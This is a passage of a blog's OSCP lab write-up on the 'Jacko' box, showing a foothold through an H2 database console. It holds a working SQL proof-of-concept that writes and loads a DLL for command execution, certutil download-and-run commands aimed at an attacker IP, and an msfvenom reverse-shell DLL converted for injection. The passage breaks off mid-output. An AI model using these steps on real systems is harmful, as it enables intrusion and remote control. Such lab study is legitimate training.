@@ -1,0 +1,444 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+    <title>Jacko :: Research blog</title>
+  
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="Webserver H2 H2 console Code execution This exploit utilises the Java Native Interface to load a Java class without needing to use the Java Compiler.
+The reason we are able to execute a dll here is due to h2 allowing support of user defined functions. User defined functions are essentially Java functions the user can execute. A snippet from a blog post I was reading online here summed this up better than i could." />
+<meta name="keywords" content="" />
+<meta name="robots" content="noodp" />
+<link rel="canonical" href="https://thomas-byrne.co.uk/oscp/jacko-writeup/" />
+
+
+
+
+<link rel="stylesheet" href="https://thomas-byrne.co.uk/assets/style.css">
+
+  <link rel="stylesheet" href="https://thomas-byrne.co.uk/assets/green.css">
+
+
+
+
+
+
+<link rel="apple-touch-icon-precomposed" sizes="144x144" href="https://thomas-byrne.co.uk/img/apple-touch-icon-144-precomposed.png">
+
+  <link rel="shortcut icon" href="https://thomas-byrne.co.uk/img/favicon/green.png">
+
+
+
+<meta name="twitter:card" content="summary" />
+
+
+
+<meta property="og:locale" content="en" />
+<meta property="og:type" content="article" />
+<meta property="og:title" content="Jacko :: Research blog">
+<meta property="og:description" content="This box was really cool. A very interesting foothold, consisting of exploiting a h2 database console to write a dll to disk. The dll can be invoked through user defined functions within the h2 console. SE impersonate was enabled with the user you gain after foothold but none of the potatos work because it is too new of a version. However a vulnerable service is running which can be exploited for `SYSTEM`." />
+<meta property="og:url" content="https://thomas-byrne.co.uk/oscp/jacko-writeup/" />
+<meta property="og:site_name" content="Jacko" />
+
+  <meta property="og:image" content="https://thomas-byrne.co.uk/.">
+
+<meta property="og:image:width" content="2048">
+<meta property="og:image:height" content="1024">
+
+
+  <meta property="article:published_time" content="2022-07-10 00:00:00 &#43;0000 UTC" />
+
+
+
+
+
+
+
+
+
+
+
+
+</head>
+<body class="green">
+
+
+<div class="container center headings--one-size">
+
+  <header class="header">
+  <div class="header__inner">
+    <div class="header__logo">
+      <a href="/">
+  <div class="logo">
+    /home
+  </div>
+</a>
+
+    </div>
+    <div class="menu-trigger">menu</div>
+  </div>
+  
+    <nav class="menu">
+  <ul class="menu__inner menu__inner--desktop">
+    
+      
+        
+          <li><a href="/about">About</a></li>
+        
+      
+        
+          <li><a href="/hackthebox">HackTheBox</a></li>
+        
+      
+      
+        <ul class="menu__sub-inner">
+          <li class="menu__sub-inner-more-trigger">Show more ▾</li>
+
+          <ul class="menu__sub-inner-more hidden">
+            
+              
+                <li><a href="/oscp">OSCP</a></li>
+              
+            
+              
+                <li><a href="/projects">Projects</a></li>
+              
+            
+              
+                <li><a href="/research">Research</a></li>
+              
+            
+              
+                <li><a href="/showcase">Showcase</a></li>
+              
+            
+          </ul>
+        </ul>
+      
+    
+
+    
+  </ul>
+
+  <ul class="menu__inner menu__inner--mobile">
+    
+      
+        <li><a href="/about">About</a></li>
+      
+    
+      
+        <li><a href="/hackthebox">HackTheBox</a></li>
+      
+    
+      
+        <li><a href="/oscp">OSCP</a></li>
+      
+    
+      
+        <li><a href="/projects">Projects</a></li>
+      
+    
+      
+        <li><a href="/research">Research</a></li>
+      
+    
+      
+        <li><a href="/showcase">Showcase</a></li>
+      
+    
+    
+  </ul>
+</nav>
+
+  
+</header>
+
+
+  <div class="content">
+    
+<div class="post">
+  <h1 class="post-title">
+    <a href="https://thomas-byrne.co.uk/oscp/jacko-writeup/">Jacko</a></h1>
+  <div class="post-meta">
+    
+      <span class="post-date">
+        2022-07-10 
+      </span>
+    
+    
+    <span class="post-author">:: Tom</span>
+    
+  </div>
+
+  
+
+  
+    <img src="https://thomas-byrne.co.uk/." class="post-cover" alt="Jacko" />
+  
+
+  
+
+  <div class="post-content"><div>
+        <h1 id="webserver">Webserver<a href="#webserver" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<h2 id="h2">H2<a href="#h2" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<h2 id="h2-console">H2 console<a href="#h2-console" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<h3 id="code-execution">Code execution<a href="#code-execution" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<p>This exploit utilises the Java Native Interface to load a Java class without needing to use the Java Compiler.</p>
+<p>The reason we are able to execute a dll here is due to h2 allowing support of <a href="http://www.h2database.com/html/features.html#user_defined_functions"><code>user defined functions</code></a>. User defined functions are essentially Java functions the user can execute. A snippet from a blog post I was reading online <a href="https://www.google.com/url?sa=t&amp;rct=j&amp;q=&amp;esrc=s&amp;source=web&amp;cd=&amp;cad=rja&amp;uact=8&amp;ved=2ahUKEwiw1LXjxe74AhUaQEEAHbxRDLQQFnoECBEQAw&amp;url=https%3A%2F%2Fmedium.com%2F%40callkalpa%2Fuser-defined-functions-and-stored-procedures-with-h2-database-a1cbfa510559&amp;usg=AOvVaw2v6yMaAV1SCglNuaTQM40t">here</a> summed this up better than i could.</p>
+<blockquote>
+<p>Support for user defined functions and stored-procedures is a sort of extension point in H2 where one can write a java method, plug it to H2 and execute it as a database function or stored procedure.</p>
+</blockquote>
+<p>To understand this exploit completely we need to understand what JNI is. JNI (Java Native Interface) is a programming interface that allows Java code running in a Java Virtual Machine or Java application to call or be called by non-native Java applications (i.e. dll, C, c++). This means it is just a way to execute code that wasn&rsquo;t written in Java, therefore it is a vector to invoke our malicious dll.</p>
+<p>The JNI allows us to use a Java class that can handle this operation without the need to compile the code.</p>
+<p>Searching around for exploits after enumerating the h2 console i came across this POC on exploitdb. It writes a dll to disk and invokes it allowing us to execute arbitrary commands on the host.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">-- Write native library
+SELECT CSVWRITE<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;C:\Windows\Temp\JNIScriptEngine.dll&#39;</span>, CONCAT<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;SELECT NULL &#34;&#39;</span>, CHAR<span style="color:#f92672">(</span>0x4d<span style="color:#f92672">)</span>,CHAR<span style="color:#f92672">(</span>0x5a<span style="color:#f92672">)</span>,CHAR<span style="color:#f92672">(</span>0x90<span style="color:#f92672">)</span>,CHAR<span style="color:#f92672">(</span>0x00<span style="color:#f92672">)</span>,CHAR<span style="color:#f92672">(</span>0x03<span style="color:#f92672">)</span>,CHAR<span style="color:#f92672">(</span>0x00<span style="color:#f92672">)</span>,CHAR<span style="color:#f92672">(</span>0x00<span style="color:#f92672">)</span>,CHAR<span style="color:#f92672">(</span>0x00<span style="color:#f92672">)</span>,CHAR<span style="color:#f92672">(</span>0x04<span style="color:#f92672">)</span>,CHAR<span style="color:#f92672">(</span>0x00<span style="color:#f92672">)</span>,CHAR<span style="color:#f92672">(</span>0x00<span style="color:#f92672">)</span>,CHAR<span style="color:#f92672">(</span>0x00<span style="color:#f92672">)</span>,CHAR<span style="color:#f92672">(</span>0xff<span style="color:#f92672">)</span>,CHAR<span style="color:#f92672">(</span>0xff<span style="color:#f92672">)</span>,CHAR<span style="color:#f92672">(</span>0x00<span style="color:#f92672">)</span>,CHAR<span style="color:#f92672">(</span>0x00<span style="color:#f92672">)</span>,CHAR<span style="color:#f92672">(</span>0xb8<span style="color:#f92672">)</span>,CHAR<span style="color:#f92672">(</span>0x00<span style="color:#f92672">)</span>,CHAR<span style="color:#f92672">(</span>0x00<span style="color:#f92672">)</span>,CHAR<span style="color:#f92672">(</span>0x00<span style="color:#f92672">)</span>,CHAR<span style="color:#f92672">(</span>0x00<span style="color:#f92672">)</span>,CHAR<span style="color:#f92672">(</span>0x00<span style="color:#f92672">)</span>,CHAR<span style="color:#f92672">(</span>0x00<span style="color:#f92672">)</span>,CHAR<span style="color:#f92672">(</span>0x00<span style="color:#f92672">)</span>,CHAR<span style="color:#f92672">(</span>0x40<span style="color:#f92672">)</span>,CHAR<span style="color:#f92672">(</span>0x00<span style="color:#f92672">)</span>,CHAR<span style="color:#f92672">(</span>0x00<span style="color:#f92672">)</span>,CHAR<span style="color:#f92672">(</span>0x00<span style="color:#f92672">)</span>,CHAR<span style="color:#f92672">(</span>0x00<span style="color:#f92672">)</span>,CHAR<span style="color:#f92672">(</span>0x00<span style="color:#f92672">)</span>,CHAR<span style="color:#f92672">(</span>0x00<span style="color:#f92672">)</span>,CHAR<span style="color:#f92672">(</span>0x00<span style="color:#f92672">)</span>,CHAR<span style="color:#f92672">(</span>0x00<span style="color:#f92672">)</span>,CHAR<span style="color:#f92672">(</span>0x00<span style="color:#f92672">)</span>,CHAR<span style="color:#f92672">(</span>0x00<span style="color:#f92672">)</span>,<span style="color:#f92672">[</span>...SNIP...<span style="color:#f92672">]</span>,CHAR<span style="color:#f92672">(</span>0x00<span style="color:#f92672">)</span>,<span style="color:#e6db74">&#39;&#34;&#39;</span><span style="color:#f92672">)</span>, <span style="color:#e6db74">&#39;ISO-8859-1&#39;</span>, <span style="color:#e6db74">&#39;&#39;</span>, <span style="color:#e6db74">&#39;&#39;</span>, <span style="color:#e6db74">&#39;&#39;</span>, <span style="color:#e6db74">&#39;&#39;</span>, <span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">)</span>;
+
+-- Load native library
+CREATE ALIAS IF NOT EXISTS System_load FOR <span style="color:#e6db74">&#34;java.lang.System.load&#34;</span>;
+CALL System_load<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;C:\Windows\Temp\JNIScriptEngine.dll&#39;</span><span style="color:#f92672">)</span>;
+
+-- Evaluate script
+CREATE ALIAS IF NOT EXISTS JNIScriptEngine_eval FOR <span style="color:#e6db74">&#34;JNIScriptEngine.eval&#34;</span>;
+CALL JNIScriptEngine_eval<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;new java.util.Scanner(java.lang.Runtime.getRuntime().exec(&#34;whoami&#34;).getInputStream()).useDelimiter(&#34;\\Z&#34;).next()&#39;</span><span style="color:#f92672">)</span>;
+
+</code></pre></div><p><img src="/images/test.png" alt="h2console"></p>
+<h1 id="foothold">Foothold<a href="#foothold" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">CALL JNIScriptEngine2_eval<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;new java.util.Scanner(java.lang.Runtime.getRuntime().exec(&#34;certutil -urlcache -f http://192.168.49.171:8000/posh.exe C:\Windows\Temp\posh.exe&#34;).getInputStream()).useDelimiter(&#34;\\Z&#34;).next()&#39;</span><span style="color:#f92672">)</span>;
+
+CALL JNIScriptEngine2_eval<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;new java.util.Scanner(java.lang.Runtime.getRuntime().exec(&#34;C:\Windows\Temp\posh.exe&#34;).getInputStream()).useDelimiter(&#34;\\Z&#34;).next()&#39;</span><span style="color:#f92672">)</span>;
+</code></pre></div><p>The payload I found online gave me a vector to execute certain system commands, but some didn&rsquo;t work. I tried to download a reverse shell that downloaded the file but failed to execute. I am going to upload my own dll and try to execute it.</p>
+<blockquote>
+<p>i didn&rsquo;t see this at the time but posh c2 generates certuil payloads that should download and execute the beacon at the same time which could have worked and saved me going through all the steps below.</p>
+</blockquote>
+<blockquote>
+<p>Also the reason some commands weren&rsquo;t working ws because i didn&rsquo;t add /c at the start of the command. Oh well, i get there in the end.</p>
+</blockquote>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">certutil -urlcache -split -f http://192.168.49.171/webhp/s/64/portal %temp%<span style="color:#ae81ff">\h</span>8hKf3B9G7LajgH.bin    &lt;--- payload <span style="color:#66d9ef">for</span> c2 download and execute
+</code></pre></div><h2 id="generating-our-own-dll-payload">Generating our own dll payload<a href="#generating-our-own-dll-payload" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<p>First lets generate a dll</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Documents/OSCPprep/jacko<span style="color:#f92672">]</span>
+└─$ msfvenom -p windows/x64/shell/reverse_tcp LHOST<span style="color:#f92672">=</span>tun0 LPORT<span style="color:#f92672">=</span><span style="color:#ae81ff">9001</span> -f dll &gt; rev.dll
+</code></pre></div><p>Now we need to grab the hex characters. <code>cat</code>ing it and piping it into <code>xxd</code> gives us this result.</p>
+<p><code>xxd</code> has given us the hex for this binary but also information like memory addresses and the string alternative either side. We can trim this with awk.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Documents/OSCPprep/jacko<span style="color:#f92672">]</span>              
+└─$ xxd rev.dll &gt; test.txt
+</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Documents/OSCPprep/jacko<span style="color:#f92672">]</span>              
+└─$ cat test.txt| awk <span style="color:#e6db74">&#39;{print($2,$3,$4,$5,$6,$7,$8,$9);}&#39;</span>                   
+4d5a <span style="color:#ae81ff">9000</span> <span style="color:#ae81ff">0300</span> <span style="color:#ae81ff">0000</span> <span style="color:#ae81ff">0400</span> <span style="color:#ae81ff">0000</span> ffff <span style="color:#ae81ff">0000</span>
+b800 <span style="color:#ae81ff">0000</span> <span style="color:#ae81ff">0000</span> <span style="color:#ae81ff">0000</span> <span style="color:#ae81ff">4000</span> <span style="color:#ae81ff">0000</span> <span style="color:#ae81ff">0000</span> <span style="color:#ae81ff">0000</span>
+<span style="color:#ae81ff">0000</span> <span style="color:#ae81ff">0000</span> <span style="color:#ae81ff">0000</span> <span style="color:#ae81ff">0000</span> <span style="color:#ae81ff">0000</span> <span style="color:#ae81ff">0000</span> <span style="color:#ae81ff">0000</span> <span style="color:#ae81ff">0000</span>
+<span style="color:#ae81ff">0000</span> <span style="color:#ae81ff">0000</span> <span style="color:#ae81ff">0000</span> <span style="color:#ae81ff">0000</span> <span style="color:#ae81ff">0000</span> <span style="color:#ae81ff">0000</span> d000 <span style="color:#ae81ff">0000</span>
+0e1f ba0e 00b4 09cd 21b8 014c cd21 <span style="color:#ae81ff">5468</span>
+<span style="color:#ae81ff">6973</span> <span style="color:#ae81ff">2070</span> 726f <span style="color:#ae81ff">6772</span> 616d <span style="color:#ae81ff">2063</span> 616e 6e6f
+<span style="color:#ae81ff">7420</span> <span style="color:#ae81ff">6265</span> <span style="color:#ae81ff">2072</span> 756e <span style="color:#ae81ff">2069</span> 6e20 444f <span style="color:#ae81ff">5320</span>        
+6d6f <span style="color:#ae81ff">6465</span> 2e0d 0d0a <span style="color:#ae81ff">2400</span> <span style="color:#ae81ff">0000</span> <span style="color:#ae81ff">0000</span> <span style="color:#ae81ff">0000</span>
+c10d 06e7 856c 68b4 856c 68b4 856c 68b4
+<span style="color:#ae81ff">9107</span> 69b5 866c 68b4 856c 69b4 886c 68b4
+741b 6cb5 846c 68b4 741b 6ab5 846c 68b4
+</code></pre></div><p>Once we have done this we need to split it into two byte chunks and wrap <code>CHAR(0x)</code> around it.</p>
+<p>The first awk statement removes all whitespace and the second splits it into 2 byte chunks</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Documents/OSCPprep/jacko<span style="color:#f92672">]</span>
+└─$ cat test2.txt|awk <span style="color:#e6db74">&#39;{ gsub(/ /,&#34;&#34;); print }&#39;</span> | awk <span style="color:#e6db74">&#39;{gsub(/.{2}/,&#34;&amp; &#34;)}1&#39;</span>
+
+4d 5a <span style="color:#ae81ff">90</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">03</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">04</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> ff ff <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> 
+b8 <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">40</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> 
+<span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> 
+<span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> d0 <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> 
+0e 1f ba 0e <span style="color:#ae81ff">00</span> b4 <span style="color:#ae81ff">09</span> cd <span style="color:#ae81ff">21</span> b8 <span style="color:#ae81ff">01</span> 4c cd <span style="color:#ae81ff">21</span> <span style="color:#ae81ff">54</span> <span style="color:#ae81ff">68</span> 
+<span style="color:#ae81ff">69</span> <span style="color:#ae81ff">73</span> <span style="color:#ae81ff">20</span> <span style="color:#ae81ff">70</span> <span style="color:#ae81ff">72</span> 6f <span style="color:#ae81ff">67</span> <span style="color:#ae81ff">72</span> <span style="color:#ae81ff">61</span> 6d <span style="color:#ae81ff">20</span> <span style="color:#ae81ff">63</span> <span style="color:#ae81ff">61</span> 6e 6e 6f 
+<span style="color:#ae81ff">74</span> <span style="color:#ae81ff">20</span> <span style="color:#ae81ff">62</span> <span style="color:#ae81ff">65</span> <span style="color:#ae81ff">20</span> <span style="color:#ae81ff">72</span> <span style="color:#ae81ff">75</span> 6e <span style="color:#ae81ff">20</span> <span style="color:#ae81ff">69</span> 6e <span style="color:#ae81ff">20</span> <span style="color:#ae81ff">44</span> 4f <span style="color:#ae81ff">53</span> <span style="color:#ae81ff">20</span>                     
+6d 6f <span style="color:#ae81ff">64</span> <span style="color:#ae81ff">65</span> 2e 0d 0d 0a <span style="color:#ae81ff">24</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> 
+c1 0d <span style="color:#ae81ff">06</span> e7 <span style="color:#ae81ff">85</span> 6c <span style="color:#ae81ff">68</span> b4 <span style="color:#ae81ff">85</span> 6c <span style="color:#ae81ff">68</span> b4 <span style="color:#ae81ff">85</span> 6c <span style="color:#ae81ff">68</span> b4 
+<span style="color:#ae81ff">91</span> <span style="color:#ae81ff">07</span> <span style="color:#ae81ff">69</span> b5 <span style="color:#ae81ff">86</span> 6c <span style="color:#ae81ff">68</span> b4 <span style="color:#ae81ff">85</span> 6c <span style="color:#ae81ff">69</span> b4 <span style="color:#ae81ff">88</span> 6c <span style="color:#ae81ff">68</span> b4 
+<span style="color:#ae81ff">74</span> 1b 6c b5 <span style="color:#ae81ff">84</span> 6c <span style="color:#ae81ff">68</span> b4 <span style="color:#ae81ff">74</span> 1b 6a b5 <span style="color:#ae81ff">84</span> 6c <span style="color:#ae81ff">68</span> b4 
+
+</code></pre></div><p>Now we can use sed to wrap the <code>CHAR(0x),</code> string around each set of 2 bytes</p>
+<p>This uses a regex statement with sed to match any character or digit followed by any chracter or digit and uses sed back-references to create a new string with the data that was just matched inserted into it.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Documents/OSCPprep/jacko<span style="color:#f92672">]</span>
+└─$ cat test3.txt | sed <span style="color:#e6db74">&#39;s/\([a-fA-F0-9]\)\([a-fA-F0-9]\)/CHAR(0x\1\2),/g&#39;</span> | head
+CHAR<span style="color:#f92672">(</span>0x4d<span style="color:#f92672">)</span>, CHAR<span style="color:#f92672">(</span>0x5a<span style="color:#f92672">)</span>, CHAR<span style="color:#f92672">(</span>0x90<span style="color:#f92672">)</span>, CHAR<span style="color:#f92672">(</span>0x00<span style="color:#f92672">)</span>, CHAR<span style="color:#f92672">(</span>0x03<span style="color:#f92672">)</span>, CHAR<span style="color:#f92672">(</span>0x00<span style="color:#f92672">)</span>, CHAR<span style="color:#f92672">(</span>0x00<span style="color:#f92672">)</span>, CHAR<span style="color:#f92672">(</span>0x00<span style="color:#f92672">)</span>, CHAR<span style="color:#f92672">(</span>0x04<span style="color:#f92672">)</span>, CHAR<span style="color:#f92672">(</span>0x00<span style="color:#f92672">)</span>, CHAR<span style="color:#f92672">(</span>0x00<span style="color:#f92672">)</span>, CHAR<span style="color:#f92672">(</span>0x00<span style="color:#f92672">)</span>, CHAR<span style="color:#f92672">(</span>0xff<span style="color:#f92672">)</span>, CHAR<span style="color:#f92672">(</span>0xff<span style="color:#f92672">)</span>, CHAR<span style="color:#f92672">(</span>0x00<span style="color:#f92672">)</span>, CHAR<span style="color:#f92672">(</span>0x00<span style="color:#f92672">)</span>, 
+CHAR<span style="color:#f92672">(</span>0xb8<span style="color:#f92672">)</span>, CHAR<span style="color:#f92672">(</span>0x00<span style="color:#f92672">)</span>, CHAR<span style="color:#f92672">(</span>0x00<span style="color:#f92672">)</span>, CHAR<span style="color:#f92672">(</span>0x00<span style="color:#f92672">)</span>, CHAR<span style="color:#f92672">(</span>0x00<span style="color:#f92672">)</span>, CHAR<span style="color:#f92672">(</span>0x00<span style="color:#f92672">)</span>, CHAR<span style="color:#f92672">(</span>0x00<span style="color:#f92672">)</span>, CHAR<span style="color:#f92672">(</span>0x00<span style="color:#f92672">)</span>, CHAR<span style="color:#f92672">(</span>0x40<span style="color:#f92672">)</span>, CHAR<span style="color:#f92672">(</span>0x00<span style="color:#f92672">)</span>, CHAR<span style="color:#f92672">(</span>0x00<span style="color:#f92672">)</span>, CHAR<span style="color:#f92672">(</span>0x00<span style="color:#f92672">)</span>, CHAR<span style="color:#f92672">(</span>0x00<span style="color:#f92672">)</span>, CHAR<span style="color:#f92672">(</span>0x00<span style="color:#f92672">)</span>, CHAR<span style="color:#f92672">(</span>0x00<span style="color:#f92672">)</span>, CHAR<span style="color:#f92672">(</span>0x00<span style="color:#f92672">)</span>, 
+CHAR<span style="color:#f92672">(</span>0x00<span style="color:#f92672">)</span>, CHAR<span style="color:#f92672">(</span>0x00<span style="color:#f92672">)</span>, CHAR<span style="color:#f92672">(</span>0x00<span style="color:#f92672">)</span>, CHAR<span style="color:#f92672">(</span>0x00<span style="color:#f92672">)</span>, CHAR<span style="color:#f92672">(</span>0x00<span style="color:#f92672">)</span>, CHAR<span style="color:#f92672">(</span>0x00<span style="color:#f92672">)</span>, CHAR<span style="color:#f92672">(</span>0x00<span style="color:#f92672">)</span>, CHAR<span style="color:#f92672">(</span>0x00<span style="color:#f92672">)</span>, CHAR<span style="color:#f92672">(</span>0x00<span style="color:#f92672">)</span>, CHAR<span style="color:#f92672">(</span>0x00<span style="color:#f92672">)</span>, CHAR<span style="color:#f92672">(</span>0x00<span style="color:#f92672">)</span>, CHAR<span style="color:#f92672">(</span>0x00<span style="color:#f92672">)</span>, CHAR<span style="color:#f92672">(</span>0x00<span style="color:#f92672">)</span>, CHAR<span style="color:#f92672">(</span>0x00<span style="color:#f92672">)</span>, CHAR<span style="color:#f92672">(</span>0x00<span style="color:#f92672">)</span>, CHAR<span style="color:#f92672">(</span>0x00<span style="color:#f92672">)</span>, 
+CHAR<span style="color:#f92672">(</span>0x00<span style="color:#f92672">)</span>, CHAR<span style="color:#f92672">(</span>0x00<span style="color:#f92672">)</span>, CHAR<span style="color:#f92672">(</span>0x00<span style="color:#f92672">)</span>, CHAR<span style="color:#f92672">(</span>0x00<span style="color:#f92672">)</span>, CHAR<span style="color:#f92672">(</span>0x00<span style="color:#f92672">)</span>, CHAR<span style="color:#f92672">(</span>0x00<span style="color:#f92672">)</span>, CHAR<span style="color:#f92672">(</span>0x00<span style="color:#f92672">)</span>, CHAR<span style="color:#f92672">(</span>0x00<span style="color:#f92672">)</span>, CHAR<span style="color:#f92672">(</span>0x00<span style="color:#f92672">)</span>, CHAR<span style="color:#f92672">(</span>0x00<span style="color:#f92672">)</span>, CHAR<span style="color:#f92672">(</span>0x00<span style="color:#f92672">)</span>, CHAR<span style="color:#f92672">(</span>0x00<span style="color:#f92672">)</span>, CHAR<span style="color:#f92672">(</span>0xd0<span style="color:#f92672">)</span>, CHAR<span style="color:#f92672">(</span>0x00<span style="color:#f92672">)</span>, CHAR<span style="color:#f92672">(</span>0x00<span style="color:#f92672">)</span>, CHAR<span style="color:#f92672">(</span>0x00<span style="color:#f92672">)</span>, 
+CHAR<span style="color:#f92672">(</span>0x0e<span style="color:#f92672">)</span>, CHAR<span style="color:#f92672">(</span>0x1f<span style="color:#f92672">)</span>, CHAR<span style="color:#f92672">(</span>0xba<span style="color:#f92672">)</span>, CHAR<span style="color:#f92672">(</span>0x0e<span style="color:#f92672">)</span>, CHAR<span style="color:#f92672">(</span>0x00<span style="color:#f92672">)</span>, CHAR<span style="color:#f92672">(</span>0xb4<span style="color:#f92672">)</span>, CHAR<span style="color:#f92672">(</span>0x09<span style="color:#f92672">)</span>, CHAR<span style="color:#f92672">(</span>0xcd<span style="color:#f92672">)</span>, CHAR<span style="color:#f92672">(</span>0x21<span style="color:#f92672">)</span>, CHAR<span style="color:#f92672">(</span>0xb8<span style="color:#f92672">)</span>, CHAR<span style="color:#f92672">(</span>0x01<span style="color:#f92672">)</span>, CHAR<span style="color:#f92672">(</span>0x4c<span style="color:#f92672">)</span>, CHAR<span style="color:#f92672">(</span>0xcd<span style="color:#f92672">)</span>, CHAR<span style="color:#f92672">(</span>0x21<span style="color:#f92672">)</span>, CHAR<span style="color:#f92672">(</span>0x54<span style="color:#f92672">)</span>, CHAR<span style="color:#f92672">(</span>0x68<span style="color:#f92672">)</span>, 
+CHAR<span style="color:#f92672">(</span>0x69<span style="color:#f92672">)</span>, CHAR<span style="color:#f92672">(</span>0x73<span style="color:#f92672">)</span>, CHAR<span style="color:#f92672">(</span>0x20<span style="color:#f92672">)</span>, CHAR<span style="color:#f92672">(</span>0x70<span style="color:#f92672">)</span>, CHAR<span style="color:#f92672">(</span>0x72<span style="color:#f92672">)</span>, CHAR<span style="color:#f92672">(</span>0x6f<span style="color:#f92672">)</span>, CHAR<span style="color:#f92672">(</span>0x67<span style="color:#f92672">)</span>, CHAR<span style="color:#f92672">(</span>0x72<span style="color:#f92672">)</span>, CHAR<span style="color:#f92672">(</span>0x61<span style="color:#f92672">)</span>, CHAR<span style="color:#f92672">(</span>0x6d<span style="color:#f92672">)</span>, CHAR<span style="color:#f92672">(</span>0x20<span style="color:#f92672">)</span>, CHAR<span style="color:#f92672">(</span>0x63<span style="color:#f92672">)</span>, CHAR<span style="color:#f92672">(</span>0x61<span style="color:#f92672">)</span>, CHAR<span style="color:#f92672">(</span>0x6e<span style="color:#f92672">)</span>, CHAR<span style="color:#f92672">(</span>0x6e<span style="color:#f92672">)</span>, CHAR<span style="color:#f92672">(</span>0x6f<span style="color:#f92672">)</span>, 
